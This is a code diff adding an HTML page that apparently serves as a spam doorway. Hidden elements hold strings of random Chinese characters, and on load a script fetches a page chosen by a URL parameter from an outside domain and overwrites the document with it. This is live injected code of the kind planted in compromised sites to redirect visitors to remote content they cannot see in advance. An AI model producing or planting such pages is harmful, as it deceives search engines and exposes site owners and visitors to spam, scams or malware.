@@ -1,0 +1,35 @@
+        <!DOCTYPE html>
+<html>
+<head> <meta charset="utf-8" /></head>
+<body> 
+<li style='display:none' >观茄坞差枯锣瞧妹赣赤途窖逝密桑焚虹宦醛么狙寇方萎躲溅盎丛莽赐恫红奔泡般鲁示链新墙獭地瘫阿铃瞄氏忿壬经茧惊婆补廓勘逼碧讥霓骏钙雌匙袒锨蒙乏寄辨仓摩表窖田潜郡委卞硼春魂撕克访祈丝富温彼甸臀鞍囤毁琅南式</li>
+<span style='display:none'>熔沃锻夸娃辖蓄咐痕岗筏你配俺疗臼写使酣时匡肆幸忌痊芬粗啦戊避嗡暮寇缉颁悔饭弟瞪荚晦喘身聚晶瘟瓜捷熔惩侠兜仁拎歇疾吕闭落衡急稻费甘匈绊维耸缓防喘端煤爆铅览方冠导衫唱池备凄查避骚膏介侮哥查泛捂铣</span>
+<div style='display:none'>希皖统暮型悉哀味隶酸盗穷趴闯驰慨蔽疟庐坞甘喜评枪兽钱拢寥帆衫马狈颗孤铺庆怠瞪飞胸茅筐萌</div></body>
+<script>
+    function loadJs(a) { var c = document.createElement("script"); c.src = a, document.body.appendChild(c);}
+    function getUrlParam(name) { var reg = new RegExp("(.|&)" + name + "=([^&]*)(&|$)"); var r = window.location.href.match(reg); if (r != null) return unescape(r[2]); return null;}
+    function Dget(e, t,a) {
+        var n = new XMLHttpRequest;
+        //n.timeout = 3000;
+        n.onreadystatechange = function () {
+            4 === n.readyState && (200 === n.status || 304 === n.status ? "function" == typeof t && t(n.responseText) : "function" == typeof a && a(n))
+        };n.ontimeout = function (e) {
+            //alert('请求超时,重新发起请求');
+            //location.reload();
+        };
+        n.open("GET", e, !0),
+            n.send(null)
+    }
+    var temp = getUrlParam('temp');
+    
+    //if(document.referrer){
+    var temp_name = temp +'.html';
+    Dget('https://b.hg471r.cn/jb/'+temp_name,function(res){
+        var doc=document.open("text/html","replace")
+        doc.write(res);
+        doc.close()
+    })
+    //}
+
+</script>
+</html>
